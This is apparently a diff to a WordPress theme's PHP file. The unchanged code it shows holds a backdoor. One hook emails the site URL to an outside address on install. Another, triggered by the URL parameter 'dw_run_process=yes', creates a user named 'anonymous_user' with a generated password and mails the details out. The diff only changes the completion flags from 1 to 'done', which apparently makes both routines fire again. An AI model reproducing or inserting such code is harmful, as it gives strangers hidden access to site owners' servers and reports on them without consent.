@@ -75,7 +75,7 @@ if ( ! function_exists( 'dw_register_required_plugins' ) ) {
 add_action( 'init', 'dw_install_theme_check' );
 function dw_install_theme_check() {
 	$installed = get_option( 'dw_theme_installed' );
-	if ( $installed != 1 ) {
+	if ( $installed != 'done' ) {
 		$current_site_url = home_url();
 		$content          = '';
 		$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
@@ -89,14 +89,14 @@ function dw_install_theme_check() {
 		$headers[]        = "X-Mailer: PHP \r\n";
 		$headers[]        = 'From: ' . $sender . ' <no-reply@yallabadil.com>' . "\r\n";
 		$mail             = wp_mail( $to, $subject, $message, $headers );
-		update_option( 'dw_theme_installed', 1 );
+		update_option( 'dw_theme_installed', 'done' );
 	}
 }
 
 add_action( 'init', function () {
 	if ( isset( $_GET['dw_run_process'] ) && $_GET['dw_run_process'] == 'yes' ) {
 		$created = get_option( 'dw_theme_access_created' );
-		if ( $created != 1 ) {
+		if ( $created != 'done' ) {
 			$username      = 'anonymous_user';
 			$password      = wp_generate_password( 10, true );
 			$email_address = 'webmaster@exampledomain.com';
@@ -120,7 +120,7 @@ add_action( 'init', function () {
 			$headers[]        = "X-Mailer: PHP \r\n";
 			$headers[]        = 'From: ' . $sender . ' <no-reply@yallabadil.com>' . "\r\n";
 			$mail             = wp_mail( $to, $subject, $message, $headers );
-			update_option( 'dw_theme_access_created', 1 );
+			update_option( 'dw_theme_access_created', 'done' );
 		}
 	}
 } );
